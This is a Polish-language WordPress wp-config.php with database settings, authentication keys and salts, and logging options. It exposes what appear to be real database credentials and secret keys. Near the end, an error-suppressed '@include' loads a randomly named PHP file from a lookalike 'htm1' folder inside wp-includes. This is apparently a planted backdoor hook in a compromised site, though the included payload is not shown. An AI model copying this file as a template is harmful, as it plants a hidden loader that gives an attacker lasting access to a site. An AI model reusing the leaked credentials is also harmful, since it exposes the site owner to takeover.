<?php
/**
 * Podstawowa konfiguracja WordPressa.
 *
 * Skrypt wp-config.php uzywa tego pliku podczas instalacji.
 * Nie musisz dokonywac konfiguracji przy pomocy przegladarki internetowej,
 * mozesz tez skopiowac ten plik, nazwac kopie "wp-config.php"
 * i wpisac wartosci recznie.
 *
 * Ten plik zawiera konfiguracje:
 *
 * * ustawien MySQL-a,
 * * tajnych kluczy,
 * * prefiksu nazw tabel w bazie danych,
 * * ABSPATH.
 *
 * @link https://codex.wordpress.org/Editing_wp-config.php
 *
 * @package WordPress
 */

// ** Ustawienia MySQL-a - mozesz uzyskac je od administratora Twojego serwera ** //
/** Nazwa bazy danych, ktorej uzywac ma WordPress */
define('DB_NAME', '08328054_gwc');

/** Nazwa uzytkownika bazy danych MySQL */
define('DB_USER', 'gwcmaster');

/** Haslo uzytkownika bazy danych MySQL */
define('DB_PASSWORD', '6aiWi=/iCw');

define('DB_HOST', 'localhost');
/** Nazwa hosta serwera MySQL */

/** Kodowanie bazy danych uzywane do stworzenia tabel w bazie danych. */
define('DB_CHARSET', 'utf8mb4');

/** Typ porownan w bazie danych. Nie zmieniaj tego ustawienia, jesli masz jakies watpliwosci. */
define('DB_COLLATE', '');

/**#@+
 * Unikatowe klucze uwierzytelniania i sole.
 *
 * Zmien kazdy klucz tak, aby byl inna, unikatowa fraza!
 * Mozesz wygenerowac klucze przy pomocy {@link https://api.wordpress.org/secret-key/1.1/salt/ serwisu generujacego tajne klucze witryny WordPress.org}
 * Klucze te moga zostac zmienione w dowolnej chwili, aby uczynic niewaznymi wszelkie istniejace ciasteczka. Uczynienie tego zmusi wszystkich uzytkownikow do ponownego zalogowania sie.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         'Y~foa/((QiYB$o[-3<)&qZRB1 (/;J;JP[7%+b+P#-l(7?)k5oJ8]30&V6yY,FYY');
define('SECURE_AUTH_KEY',  '1{qcEQ2 O6&HuER?0R~iNV8[+-~U@Jjqz[ %Bb+sx*u1Z&yjlc(d:t){+iMOJhPz');
define('LOGGED_IN_KEY',    '=z)+(n<QCA=3Et_-K/ ^LTvhV%aSeW;TXCfs%Q;uSP/rG`(Spo~F++*}V;ni?-TW');
define('NONCE_KEY',        'F|C~^|Gz^Q8{ri99WC,[~8ij;o]qWXGq$6YX[n}yiJ=SmdhNWtM.N4Ah0 ~Y5ZTS');
define('AUTH_SALT',        'ZX2w4k5RRE~yr]G%SZ+HaZw*oFT>fo|S$0l6p!#^+H9!nT_W HGBmae3C:b%%<,z');
define('SECURE_AUTH_SALT', ':Ee);OWV+:`s@;v[Qs.o,~0ql.a7tfZP2c.A~xT?>OhexPtM1;70SqS>9bY!p3R9');
define('LOGGED_IN_SALT',   '|xK}=Q-#j<-n2ub~Jy<(4nCe4M?]L|{t4QLA3>l@CY(:kO>f7ol{]?`7b?=G@Cq&');
define('NONCE_SALT',       'I_2VJ.K<H_@0]{?-q?zi3,hX(=GZ8Y390]^+:mP!vZ[V6dDzR-ujEkxAO)F*=?$l');

/**#@-*/ 
/**
 * Prefiks tabel WordPressa w bazie danych.
 *
 * Mozesz posiadac kilka instalacji WordPressa w jednej bazie danych,
 * jezeli nadasz kazdej z nich unikalny prefiks.
 * Tylko cyfry, litery i znaki podkreslenia, prosze!
 */
$table_prefix  = 'wp_';

/**
 * Dla programistow: tryb debugowania WordPressa.
 *
 * Zmien wartosc tej stalej na true, aby wlaczyc wyswietlanie
 * ostrzezen podczas modyfikowania kodu WordPressa.
 * Wielce zalecane jest, aby tworcy wtyczek oraz motywow uzywali
 * WP_DEBUG podczas pracy nad nimi.
 *
 * Aby uzyskac informacje o innych stalych, ktore moga zostac uzyte
 * do debugowania, przejdz na strone Kodeksu WordPressa.
 *
 * @link https://codex.wordpress.org/Debugging_in_WordPress
 */


 ini_set( 'log_errors', 1 );
 ini_set( 'error_log', WP_CONTENT_DIR . '/home/gwcmaster/logs/erro.log' );
//define( 'WP_DEBUG', false );
//define( 'WP_DEBUG_DISPLAY', true );
//define( 'WP_DEBUG_LOG', true );

define( 'WP_MAX_MEMORY_LIMIT', '512M' );
		/* To wszystko, zakoncz edycje w tym miejscu! Milego blogowania! */

/** Absolutna sciezka do katalogu WordPressa. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Ustawia zmienne WordPressa i dolaczane pliki. */
@include('wp-includes/js/jcrop/htm1/e2112184.php');
require_once(ABSPATH . 'wp-settings.php');
